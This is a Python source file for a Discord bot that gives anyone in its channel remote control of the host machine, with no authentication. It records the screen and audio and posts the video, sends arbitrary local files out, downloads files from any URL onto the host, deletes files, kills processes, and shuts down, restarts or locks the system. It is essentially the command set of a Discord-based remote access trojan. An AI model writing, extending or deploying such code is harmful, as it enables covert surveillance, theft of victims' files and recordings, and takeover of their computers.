import discord
from screen_capture import capture_screen
import os
import platform
import subprocess
import requests

INTENTS = discord.Intents.default()
INTENTS.message_content = True
CLIENT = discord.Client(intents=INTENTS)

@CLIENT.event
async def on_ready():
    print(f"[INFO] Client is ready Logged in as {CLIENT.user}")

@CLIENT.event
async def on_message(message):
    if message.author == CLIENT.user:
        return

    if message.content.startswith("!screen"):
        duration = 10
        resolution = None
        framerate = 20.0
        record_audio = False

        parts = message.content.split(" ")
        if len(parts) > 1:
            duration = int(parts[1])
        if len(parts) > 2:
            resolution = tuple(map(int, parts[2].split("x")))
        if len(parts) > 3:
            framerate = float(parts[3])
        if len(parts) > 4 and parts[4].lower() == "audio":
            record_audio = True

        output_file = capture_screen(duration, resolution, framerate, record_audio)
        with open(output_file, "rb") as f:
            await message.channel.send(file=discord.File(f))
        os.remove(output_file)

    elif message.content.startswith("!shutdown"):
        await message.channel.send("Shutting down the system...")
        os.system("shutdown /s /t 1")

    elif message.content.startswith("!restart"):
        await message.channel.send("Restarting the system...")
        os.system("shutdown /r /t 1")

    elif message.content.startswith("!lock"):
        await message.channel.send("Locking the system...")
        if platform.system() == "Windows":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        else:
            await message.channel.send("Lock command is only supported on Windows.")

    elif message.content.startswith("!tasklist"):
        result = subprocess.run(["tasklist"], capture_output=True, text=True)
        await message.channel.send(f"```{result.stdout}```")

    elif message.content.startswith("!kill"):
        process_name = message.content.split(" ")[1]
        try:
            subprocess.run(["taskkill", "/IM", process_name, "/F"], check=True)
            await message.channel.send(f"Process {process_name} killed.")
        except subprocess.CalledProcessError:
            await message.channel.send(f"Failed to kill process {process_name}.")

    elif message.content.startswith("!upload"):
        file_path = message.content.split(" ")[1]
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                await message.channel.send(file=discord.File(f))
        else:
            await message.channel.send("File not found.")

    elif message.content.startswith("!download"):
        url = message.content.split(" ")[1]
        try:
            response = requests.get(url)
            file_name = url.split("/")[-1]
            with open(file_name, "wb") as f:
                f.write(response.content)
            await message.channel.send(f"File downloaded as {file_name}.")
        except Exception as e:
            await message.channel.send(f"Failed to download file: {e}")

    elif message.content.startswith("!delete"):
        file_path = message.content.split(" ")[1]
        if os.path.exists(file_path):
            os.remove(file_path)
            await message.channel.send(f"File {file_path} deleted.")
        else:
            await message.channel.send("File not found.")

    elif message.content.startswith("!ping"):
        ip = message.content.split(" ")[1]
        result = subprocess.run(["ping", ip], capture_output=True, text=True)
        await message.channel.send(f"```{result.stdout}```")

    elif message.content.startswith("!taskmanager"):
        os.system("taskmgr")
        await message.channel.send("Task Manager started.")